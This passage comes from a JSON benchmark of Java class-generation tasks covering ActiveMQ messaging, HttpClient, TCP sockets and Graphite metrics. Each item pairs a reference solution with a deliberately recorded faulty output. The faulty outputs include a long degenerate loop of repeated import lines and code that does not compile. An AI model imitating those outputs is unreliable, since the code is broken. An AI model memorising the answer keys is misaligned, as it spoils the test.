javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth"
  },
  {
    "Task_id": 4,
    "Instruction": "Task Description: Create a Java class that implements an ActiveMQ message producer capable of sending messages to both queues and topics.\n\nClass Description: The JmsProducer class is responsible for establishing a connection to an ActiveMQ broker, creating both queue and topic destinations, and sending multiple text messages to each destination. It handles connection management and includes error handling for JMS operations.\n\nAttributes:\n- USERNAME: [String] - Default username for ActiveMQ connection (default: ActiveMQConnection.DEFAULT_USER)\n- PASSWORD: [String] - Default password for ActiveMQ connection (default: ActiveMQConnection.DEFAULT_PASSWORD)\n- BROKEURL: [String] - Default broker URL for ActiveMQ connection (default: ActiveMQConnection.DEFAULT_BROKER_URL)\n- SENDNUM: [int] - Number of messages to send to each destination (default: 10)\n\nMethods:\n- run(): [void] - Main method that establishes the connection, creates destinations (queue and topic), and initiates message sending. Handles connection lifecycle and error cases.\n- sendMessage(Session session, MessageProducer messageProducer, String type): [void] - Helper method that creates and sends multiple text messages with timestamps to the specified destination. \n  Parameters:\n    - session: [Session] - JMS session for message creation\n    - messageProducer: [MessageProducer] - Producer for sending messages\n    - type: [String] - Destination type identifier (\"QUEUE\" or \"TOPIC\") for logging purposes",
    "Canonical_solution": "import javax.jms.Connection;\nimport javax.jms.ConnectionFactory;\nimport javax.jms.Destination;\nimport javax.jms.JMSException;\nimport javax.jms.MessageProducer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnection;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsProducer {\n\n    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;\n    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;\n    private static final String BROKEURL = ActiveMQConnection.DEFAULT_BROKER_URL;\n    private static final int SENDNUM = 10;\n\n    public static void run() {\n        ConnectionFactory connectionFactory;\n        Connection connection = null;\n        Session session;\n        Destination destination;\n        MessageProducer messageProducer;\n        \n        connectionFactory = new ActiveMQConnectionFactory(JmsProducer.USERNAME, JmsProducer.PASSWORD, JmsProducer.BROKEURL);\n        try {\n            connection = connectionFactory.createConnection();\n            connection.start();\n            session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);\n            destination = session.createQueue(\"SAMPLE_MQ_QUEUE\");\n            messageProducer = session.createProducer(destination);\n            sendMessage(session, messageProducer, \"QUEUE\");\n\n            destination = session.createTopic(\"SAMPLE_MQ_TOPIC\");\n            messageProducer = session.createProducer(destination);\n            sendMessage(session, messageProducer, \"TOPIC\");\n            session.commit();\n            Thread.sleep(1000);\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (connection != null) {\n                try {\n                    connection.close();\n                } catch (JMSException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public static void sendMessage(Session session, MessageProducer messageProducer, String type) throws Exception {\n        for (int i = 0; i < JmsProducer.SENDNUM; i++) {\n            Date date = new Date();\n            TextMessage message = session.createTextMessage(\"ActiveMQ \u53d1\u9001\u6d88\u606f\u65f6\u95f4\uff1a\" + date);\n            System.out.println(\"\\t\" + type + \"\\t\u53d1\u9001\u6d88\u606f\uff1aActivemq \u53d1\u9001\u6d88\u606f\u65f6\u95f4\uff1a\" + date);\n            messageProducer.send(message);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 38,
    "wrong_result": "import javax.jms.*;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsProducer {\n    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;\n    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;\n    private static final String BROKEURL = ActiveMQConnection.DEFAULT_BROKER_URL;\n    private static final int SENDNUM = 10;\n\n    public void run() {\n        try (ConnectionFactory factory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKEURL);\n             Connection connection = factory.createConnection();\n             Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE)) {\n            Queue queue = session.createQueue(\"myQueue\");\n            Topic topic = session.createTopic(\"myTopic\");\n            MessageProducer queueProducer = session.createProducer(queue);\n            MessageProducer topicProducer = session.createProducer(topic);\n            sendMessage(session, queueProducer, \"QUEUE\");\n            sendMessage(session, topicProducer, \"TOPIC\");\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void sendMessage(Session session, MessageProducer producer, String type) throws JMSException {\n        for (int i = 0; i < SENDNUM; i++) {\n            TextMessage message = session.createTextMessage(\"Message \" + i + \" at \" + System.currentTimeMillis());\n            producer.send(message);\n            System.out.println(\"Sent \" + type + \" message: \" + message.getText());\n        }\n    }\n\n    public static void main(String[] args) {\n        JmsProducer producer = new JmsProducer();\n        producer.run();\n    }\n}"
  },
  {
    "Task_id": 40,
    "Instruction": "Task Description: Create a Java class that facilitates HTTP communication using Java's HttpClient, supporting GET requests with configurable options and error handling.\n\nClass Description: The HttpCommunicator class provides functionality to send HTTP GET requests to specified URIs. It includes features like automatic redirect following and optional error suppression for non-critical requests. The class encapsulates the HttpClient instance and provides methods for request execution.\n\nAttributes:\nhttpClient: [HttpClient] - The underlying HttpClient instance used for all HTTP communications, configured to always follow redirects.\n\nMethods:\nsendGetRequest: [Name](String uri, Map<String, Object> attributes) -> String - Sends a GET request to the specified URI. The attributes map can contain optional parameters like \"optional-option\" to suppress exceptions for non-critical requests. Returns the response body as a string or empty string for optional failed requests.\n\nreadUri: [Name](URI uri, boolean optional) -> String - Internal method that constructs and executes the HTTP request. If optional is true, returns empty string on failure instead of throwing an exception.\n\nisHttpOrHttps: [Name](String url) -> boolean - Helper method to check if a URL string uses HTTP or HTTPS protocol. Returns true if the URL starts with \"http://\" or \"https://\".",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.Map;\n\npublic class HttpCommunicator {\n\n    private HttpClient httpClient;\n\n    public HttpCommunicator() {\n        this.httpClient = HttpClient.newBuilder()\n                .followRedirects(HttpClient.Redirect.ALWAYS)\n                .build();\n    }\n\n    public String sendGetRequest(String uri, Map<String, Object> attributes) {\n        boolean isOptional = attributes.containsKey(\"optional-option\");\n        return readUri(URI.create(uri), isOptional);\n    }\n\n    private String readUri(URI uri, boolean optional) {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(uri)\n                .GET()\n                .build();\n        try {\n            return httpClient.send(request, HttpResponse.BodyHandlers.ofString()).body();\n        } catch (Exception e) {\n            if (optional) {\n                return \"\";\n            } else {\n                throw new RuntimeException(e);\n            }\n        }\n    }\n\n    private boolean isHttpOrHttps(String url) {\n        return url != null && (url.startsWith(\"http://\") || url.startsWith(\"https://\"));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.Map;\n\npublic class HttpCommunicator {\n    private final HttpClient httpClient;\n\n    public HttpCommunicator() {\n        this.httpClient = HttpClient.newHttpClient();\n        this.httpClient.followRedirects(true);\n    }\n\n    public String sendGetRequest(String uri, Map<String, Object> attributes) {\n        boolean isOptional = attributes != null && attributes.containsKey(\"optional-option\");\n        return readUri(new URI(uri), isOptional);\n    }\n\n    private String readUri(URI uri, boolean optional) {\n        try {\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(uri)\n                    .GET()\n                    .build();\n            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n            if (response.statusCode() >= 200 && response.statusCode() < 300) {\n                return response.body();\n            } else {\n                if (optional) {\n                    return \"\";\n                } else {\n                    throw new RuntimeException(\"HTTP request failed with status code: \" + response.statusCode());\n                }\n            }\n        } catch (Exception e) {\n            if (optional) {\n                return \"\";\n            } else {\n                throw new RuntimeException(\"HTTP request failed\", e);\n            }\n        }\n    }\n\n    public boolean isHttpOrHttps(String url) {\n        return url.startsWith(\"http://\") || url.startsWith(\"https://\");\n    }\n}"
  },
  {
    "Task_id": 400,
    "Instruction": "Task Description: Create a TCP client class in Java that establishes a connection to a server, allows sending messages to the server, and receives echoed responses until the termination command is sent.\n\nClass Description: The EchoClient class represents a TCP client that connects to a specified server host and port. It provides functionality for sending user input to the server and displaying the server's response, continuing this echo process until the user sends \"bye\" to terminate the connection.\n\nAttributes:\n- client: Socket - The socket used for the TCP connection to the server\n- input: BufferedReader - Reads user input from the console\n- buf: BufferedReader - Reads data from the server's response stream\n- out: PrintStream - Writes data to the server's output stream\n\nMethods:\n- EchoClient(String host, int port) -> void - Constructor that establishes a connection to the specified host and port, initializing the input/output streams\n- start() -> void - Starts the client interaction loop, reading user input and sending it to the server while displaying responses\n- close() -> void - Closes all open streams and the socket connection",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.net.Socket;\n\npublic class EchoClient {\n\n    private Socket client;\n    private BufferedReader input;\n    private BufferedReader buf;\n    private PrintStream out;\n\n    public EchoClient(String host, int port) throws Exception {\n        client = new Socket(host, port);\n        input = new BufferedReader(new InputStreamReader(System.in));\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n        out = new PrintStream(client.getOutputStream());\n    }\n\n    public void start() throws Exception {\n        boolean flag = true;\n        while (flag) {\n            System.out.print(\"\u8f93\u5165\u4fe1\u606f\uff1a\");\n            String str = input.readLine();\n            out.println(str);\n            if (\"bye\".equals(str)) {\n                flag = false;\n            } else {\n                String echo = buf.readLine();\n                System.out.println(echo);\n            }\n        }\n        close();\n    }\n\n    public void close() throws Exception {\n        buf.close();\n        client.close();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class EchoClient {\n    private Socket client;\n    private BufferedReader input;\n    private BufferedReader buf;\n    private PrintStream out;\n\n    public EchoClient(String host, int port) throws IOException {\n        client = new Socket(host, port);\n        input = new BufferedReader(new InputStreamReader(System.in));\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n        out = new PrintStream(client.getOutputStream());\n    }\n\n    public void start() throws IOException {\n        String message;\n        while (true) {\n            System.out.print(\"Enter message (type 'bye' to exit): \");\n            message = input.readLine();\n            if (message.equalsIgnoreCase(\"bye\")) {\n                break;\n            }\n            out.println(message);\n            String response = buf.readLine();\n            System.out.println(\"Server response: \" + response);\n        }\n    }\n\n    public void close() throws IOException {\n        if (client != null) {\n            client.close();\n        }\n        if (input != null) {\n            input.close();\n        }\n        if (buf != null) {\n            buf.close();\n        }\n        if (out != null) {\n            out.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 401,
    "Instruction": "Task Description: Create a Java class that implements TCP client functionality for establishing a connection to a server, sending messages, and closing the connection.\n\nClass Description: The `SocketConnectTest` class provides basic TCP client capabilities using Java's Socket and I/O classes. It handles connection establishment, message transmission, and resource cleanup.\n\nAttributes:\n- client: [Socket] - The socket object representing the connection to the server\n- writer: [Writer] - The output stream writer for sending data to the server\n\nMethods:\n- connect: [connect(String host, int port)] -> [void] - Establishes a connection to the specified server host and port, initializing the socket and writer\n- sendMessage: [sendMessage(String message)] -> [void] - Sends the specified message to the connected server\n- close: [close()] -> [void] - Closes the writer and socket connection, releasing system resources",
    "Canonical_solution": "import java.io.*;\nimport java.net.Socket;\n\npublic class SocketConnectTest {\n\n    private Socket client;\n    private Writer writer;\n\n    public void connect(String host, int port) throws IOException {\n        client = new Socket(host, port);\n        writer = new OutputStreamWriter(client.getOutputStream());\n    }\n\n    public void sendMessage(String message) throws IOException {\n        writer.write(message);\n        writer.flush();\n    }\n\n    public void close() throws IOException {\n        writer.close();\n        client.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class SocketConnectTest {\n    private Socket client;\n    private Writer writer;\n\n    public void connect(String host, int port) throws IOException {\n        client = new Socket(host, port);\n        OutputStream os = client.getOutputStream();\n        writer = new BufferedWriter(new OutputStreamWriter(os));\n    }\n\n    public void sendMessage(String message) throws IOException {\n        writer.write(message);\n        writer.flush();\n    }\n\n    public void close() throws IOException {\n        if (writer != null) {\n            writer.close();\n        }\n        if (client != null) {\n            client.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 402,
    "Instruction": "Task Description: Create an asynchronous task in Android that performs an HTTP GET request to a specified server using TCP socket communication, reads the response, and returns it to the caller via a callback mechanism.\n\nClass Description: HttpGetTask is an AsyncTask subclass that handles network operations in the background to prevent blocking the UI thread. It establishes a TCP connection to a server, sends an HTTP GET request, reads the response, and delivers it to a retained fragment through a weak reference.\n\nAttributes:\n- TAG: [String] - A constant for logging purposes\n- HOST: [String] - The hostname of the server to connect to\n- USER_NAME: [String] - The username for authentication\n- HTTP_GET_COMMAND: [String] - The formatted HTTP GET request string\n- mListener: [WeakReference<RetainedFragment>] - Weak reference to the fragment that will receive the result\n\nMethods:\n- HttpGetTask([RetainedFragment retainedFragment]) -> [void] - Constructor that initializes the task with a weak reference to the calling fragment\n- doInBackground([Void... params]) -> [String] - Performs the network operations in the background (opens socket, sends request, reads response)\n- onPostExecute([String result]) -> [void] - Delivers the result to the retained fragment after task completion\n- readStream([InputStream in]) -> [String] - Helper method that reads data from an input stream and returns it as a string",
    "Canonical_solution": "import android.os.AsyncTask;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.lang.ref.WeakReference;\nimport java.net.Socket;\n\npublic class HttpGetTask extends AsyncTask<Void, Void, String> {\n\n    private static final String TAG = \"HttpGetTask\";\n    private static final String HOST = \"api.geonames.org\";\n    private static final String USER_NAME = \"aporter\";\n    private static final String HTTP_GET_COMMAND = \"GET /earthquakesJSON?north=44.1&south=-9.9&east=-22.4&west=55.2&username=\"\n            + USER_NAME + \" HTTP/1.1\" + \"\\n\" + \"Host: \" + HOST + \"\\n\"\n            + \"Connection: close\" + \"\\n\\n\";\n\n    private final WeakReference<RetainedFragment> mListener;\n\n    public HttpGetTask(RetainedFragment retainedFragment) {\n        mListener = new WeakReference<>(retainedFragment);\n    }\n\n    @Override\n    protected String doInBackground(Void... params) {\n        Socket socket = null;\n        String data = \"\";\n\n        try {\n            socket = new Socket(HOST, 80);\n            PrintWriter pw = new PrintWriter(new OutputStreamWriter(\n                    socket.getOutputStream()), true);\n            pw.println(HTTP_GET_COMMAND);\n\n            data = readStream(socket.getInputStream());\n\n        } catch (IOException exception) {\n            exception.printStackTrace();\n        } finally {\n            if (null != socket)\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n        }\n        return data;\n    }\n\n    @Override\n    protected void onPostExecute(String result) {\n        if (null != mListener.get()) {\n            mListener.get().onDownloadFinished(result);\n        }\n    }\n\n    private String readStream(InputStream in) {\n        BufferedReader reader = null;\n        StringBuilder data = new StringBuilder();\n        try {\n            reader = new BufferedReader(new InputStreamReader(in));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                data.append(line);\n            }\n        } catch (IOException e) {\n            Log.e(TAG, \"IOException\");\n        } finally {\n            if (reader != null) {\n                try {\n                    reader.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n            }\n        }\n        return data.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class HttpGetTask extends AsyncTask<Void, Void, String> {\n    private static final String TAG = \"HttpGetTask\";\n    private String HOST;\n    private String USER_NAME;\n    private String HTTP_GET_COMMAND;\n    private WeakReference<RetainedFragment> mListener;\n\n    public HttpGetTask(RetainedFragment retainedFragment) {\n        mListener = new WeakReference<>(retainedFragment);\n    }\n\n    @Override\n    protected String doInBackground(Void... params) {\n        try {\n            Socket socket = new Socket(HOST, 80);\n            OutputStream os = socket.getOutputStream();\n            os.write(HTTP_GET_COMMAND.getBytes());\n            os.flush();\n            InputStream is = socket.getInputStream();\n            String response = readStream(is);\n            socket.close();\n            return response;\n        } catch (IOException e) {\n            return \"Error: \" + e.getMessage();\n        }\n    }\n\n    private String readStream(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line).append(\"\\n\");\n        }\n        return sb.toString();\n    }\n\n    @Override\n    protected void onPostExecute(String result) {\n        RetainedFragment fragment = mListener.get();\n        if (fragment != null) {\n            fragment.onResult(result);\n        }\n    }\n}"
  },
  {
    "Task_id": 404,
    "Instruction": "Task Description: Create a TCP client class in Java that can establish a connection to a server, send requests, and receive responses.\n\nClass Description: The TcpClient class provides functionality to connect to a TCP server, send string requests, and receive string responses. It handles socket creation, data transmission, and resource cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the server to connect to\n- port: int - The port number on which the server is listening\n- TAG: String - A constant for logging purposes (default value: \"HttpGet\")\n\nMethods:\n- TcpClient(String host, int port) -> None - Constructor that initializes the host and port attributes\n- sendRequest(String request) -> String - Sends the request string to the server and returns the response\n- readStream(InputStream in) -> String - Helper method that reads data from an input stream and returns it as a string",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TcpClient {\n\n    private static final String TAG = \"HttpGet\";\n    private String host;\n    private int port;\n\n    public TcpClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String sendRequest(String request) {\n        Socket socket = null;\n        String data = \"\";\n\n        try {\n            socket = new Socket(host, port);\n            PrintWriter pw = new PrintWriter(new OutputStreamWriter(\n                    socket.getOutputStream()), true);\n            pw.println(request);\n\n            data = readStream(socket.getInputStream());\n\n        } catch (UnknownHostException exception) {\n            exception.printStackTrace();\n        } catch (IOException exception) {\n            exception.printStackTrace();\n        } finally {\n            if (null != socket)\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n        }\n        return data;\n    }\n\n    private String readStream(InputStream in) {\n        BufferedReader reader = null;\n        StringBuffer data = new StringBuffer();\n        try {\n            reader = new BufferedReader(new InputStreamReader(in));\n            String line = \"\";\n            while ((line = reader.readLine()) != null) {\n                data.append(line);\n            }\n        } catch (IOException e) {\n            Log.e(TAG, \"IOException\");\n        } finally {\n            if (reader != null) {\n                try {\n                    reader.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n            }\n        }\n        return data.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class TcpClient {\n    private String host;\n    private int port;\n    private static final String TAG = \"HttpGet\";\n\n    public TcpClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String sendRequest(String request) {\n        try (Socket socket = new Socket(host, port);\n             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n            out.println(request);\n            return readStream(socket.getInputStream());\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private String readStream(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line);\n        }\n        return sb.toString();\n    }\n}"
  },
  {
    "Task_id": 405,
    "Instruction": "Task Description: Create a Java class that implements a TCP client for pushing metrics to a Graphite server, with support for periodic pushing and character sanitization for Graphite compatibility.\n\nClass Description: The Graphite class provides functionality to connect to a Graphite server via TCP and push metrics from a CollectorRegistry. It handles character sanitization for Graphite compatibility and supports both one-time pushes and periodic pushing via a daemon thread.\n\nAttributes:\n- host: String - The hostname or IP address of the Graphite server\n- port: int - The port number of the Graphite server\n- logger: Logger - Logger instance for error logging\n- INVALID_GRAPHITE_CHARS: Pattern - Regular expression pattern for invalid Graphite characters\n\nMethods:\n- Graphite(String host, int port) -> None - Constructor that initializes the Graphite client with server connection details\n- push(CollectorRegistry registry) -> void - Pushes all metrics from the registry to Graphite server immediately. Throws IOException if connection fails\n- start(CollectorRegistry registry) -> Thread - Starts a daemon thread that pushes metrics every 60 seconds\n- start(CollectorRegistry registry, int intervalSeconds) -> Thread - Starts a daemon thread that pushes metrics at specified intervals\n- PushThread(CollectorRegistry registry, int intervalSeconds) -> None - Inner class constructor for the periodic push thread\n- run() -> void - The main execution method of PushThread that handles periodic metric pushing",
    "Canonical_solution": "import io.prometheus.client.Collector;\nimport io.prometheus.client.CollectorRegistry;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.Socket;\nimport java.nio.charset.Charset;\nimport java.util.Collections;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\nimport java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class Graphite {\n  private static final Logger logger = Logger.getLogger(Graphite.class.getName());\n  private final String host;\n  private final int port;\n  private static final Pattern INVALID_GRAPHITE_CHARS = Pattern.compile(\"[^a-zA-Z0-9_-]\");\n\n  public Graphite(String host, int port) {\n    this.host = host;\n    this.port = port;\n  }\n\n  public void push(CollectorRegistry registry) throws IOException {\n    Socket s = new Socket(host, port);\n    BufferedWriter writer = new BufferedWriter(new PrintWriter(new OutputStreamWriter(s.getOutputStream(), Charset.forName(\"UTF-8\")));\n    Matcher m = INVALID_GRAPHITE_CHARS.matcher(\"\");\n    long now = System.currentTimeMillis() / 1000;\n    for (Collector.MetricFamilySamples metricFamilySamples: Collections.list(registry.metricFamilySamples())) {\n      for (Collector.MetricFamilySamples.Sample sample: metricFamilySamples.samples) {\n        m.reset(sample.name);\n        writer.write(m.replaceAll(\"_\"));\n        for (int i = 0; i < sample.labelNames.size(); ++i) {\n          m.reset(sample.labelValues.get(i));\n          writer.write(\";\" + sample.labelNames.get(i) + \"=\" + m.replaceAll(\"_\"));\n        }\n        writer.write(\" \" + sample.value + \" \" + now + \"\\n\");\n      }\n    }\n    writer.close();\n    s.close();\n  }\n\n  public Thread start(CollectorRegistry registry) {\n    return start(registry, 60);\n  }\n\n  public Thread start(CollectorRegistry registry, int intervalSeconds) {\n    Thread thread = new PushThread(registry, intervalSeconds);\n    thread.setDaemon(true);\n    thread.start();\n    return thread;\n  }\n\n  private class PushThread extends Thread {\n    private final CollectorRegistry registry;\n    private final int intervalSeconds;\n\n    PushThread(CollectorRegistry registry, int intervalSeconds) {\n      this.registry = registry;\n      this.intervalSeconds = intervalSeconds;\n    }\n\n    public void run() {\n      long waitUntil = System.currentTimeMillis();\n      while (true) {\n        try {\n          push(registry);\n        } catch (IOException e) {\n          logger.log(Level.WARNING, \"Exception \" + e + \" pushing to \" + host + \":\" + port, e);\n        }\n\n        long now = System.currentTimeMillis();\n        while (now >= waitUntil) {\n          waitUntil += intervalSeconds * 1000;\n        }\n        try {\n          Thread.sleep(waitUntil - now);\n        } catch (InterruptedException e) {\n          return;\n        }\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "import java.net.Socket; import java.io.OutputStream; import java.io.IOException; import java.util.logging.Logger; import java.util.regex.Pattern; import java.util.concurrent.TimeUnit; public class Graphite { private final String host; private final int port; private final Logger logger; private static final Pattern INVALID_GRAPHITE_CHARS = Pattern.compile(\"[^a-zA-Z0-9._:-]\"); public Graphite(String host, int port) { this.host = host; this.port = port; this.logger = Logger.getLogger(Graphite.class.getName()); } public void push(CollectorRegistry registry) throws IOException { try (Socket socket = new Socket(host, port); OutputStream out = socket.getOutputStream()) { for (Metric metric : registry.collect()) { String sanitizedName = sanitize(metric.getName()); double value = metric.getValue(); String line = sanitizedName + \":\" + value; out.write(line.getBytes()); out.write('\\n'); } } catch (IOException e) { logger.severe(\"Failed to push metrics: \" + e.getMessage()); throw e; } } private String sanitize(String name) { return INVALID_GRAPHITE_CHARS.matcher(name).replaceAll(\"\"); } public Thread start(CollectorRegistry registry) { return start(registry, 60); } public Thread start(CollectorRegistry registry, int intervalSeconds) { Thread thread = new Thread(new PushThread(registry, intervalSeconds)); thread.setDaemon(true); thread.start(); return thread; } private class PushThread implements Runnable { private final CollectorRegistry registry; private final int intervalSeconds; public PushThread(CollectorRegistry registry, int intervalSeconds) { this.registry = registry; this.intervalSeconds = intervalSeconds; } @Override public void run() { while (true) { try { push(registry); TimeUnit.SECONDS.sleep(intervalSeconds); } catch (InterruptedException | 